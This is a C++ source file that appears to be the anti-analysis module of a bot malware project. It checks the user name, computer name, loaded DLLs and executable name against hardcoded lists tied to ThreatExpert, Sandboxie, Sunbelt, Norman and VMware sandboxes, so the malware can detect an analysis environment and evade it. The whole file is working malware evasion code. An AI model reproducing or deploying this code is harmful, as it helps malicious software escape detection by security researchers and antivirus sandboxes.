#include "StdAfx.h"

#ifdef _HASANTIS
// u can do it like this cos its not DCI
	// for dci u can also do it like this
// but in gbot.cpp u must #include "blah.cpp"

char* sUsers[] = { "HfreAnzr", //threat expert (UserName)
                  "hfre", //sandbox (user)
				  "sandbox", "honey", "vmware", "currentuser", "nepenthes", "andy" //vmware & norman 
				};

char* sComputers[] = { "ComputerName", "COMPUTERNAME", "DELL-D3E62F7E26", "DWI-9625AC2E275", "MICHAEL-F156CF7"}; 
                  
char* sModules[] = { "SbieDll.dll",  //sandboxie 
					 "api_log.dll", //sunbelt
					 "dir_watch.dll", //sunbelt sanbox
					 "dbghelp.dll"}; //vmware



bool IsThreatEx()
{
    CHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    if((!strcmp(szFileName, "sample.exe")) || (!strcmp(szFileName, "sample_1.exe")))
    {
        return true;
    }
    else
    {
        return false;
    }
}


bool IsCwS()
{

    char sizBuffer[30];
    unsigned long lSize = sizeof( sizBuffer );
    
    if( GetComputerName( sizBuffer, &lSize ) == 0 )
        return( 1 );
        
    for( int i = 0; i < ( sizeof( sComputers ) / sizeof( char* ) ); i++ )
    {
         if( !strcmp( sizBuffer, sComputers[ i ] ) )
         {
             return true;
         }
    }
    return false;

}
          
				
bool ModuleCheck()
{
    for( int i = 0; i < ( sizeof( sModules ) / sizeof( char* ) ); i++ )
    {
        if( GetModuleHandle( sModules[ i ] ) ) 
        {
            return true;	// guys an idiot...
        }
    }
    return false;
}

bool UserCheck()
{
    char szBuffer[30];
    unsigned long lSize = sizeof( szBuffer );
    
    if( GetUserName( szBuffer, &lSize ) == 0 )
        return( 1 );
        
    for( int i = 0; i < ( sizeof( sUsers ) / sizeof( char* ) ); i++ )
    {
         if( !strcmp( szBuffer, sUsers[ i ] ) )
         {
             return true;
         }
    }
	
    return false;
}

bool UseAnti()
{
	bool ret = false;

	if ((ret = IsThreatEx()) == true)
		return ret;
	if ((ret = IsCwS()) == true)
		return ret;
	if ((ret = UserCheck()) == true)
		return ret;
	if ((ret = ModuleCheck()) == true)
		return ret;

	return ret;
}

#endif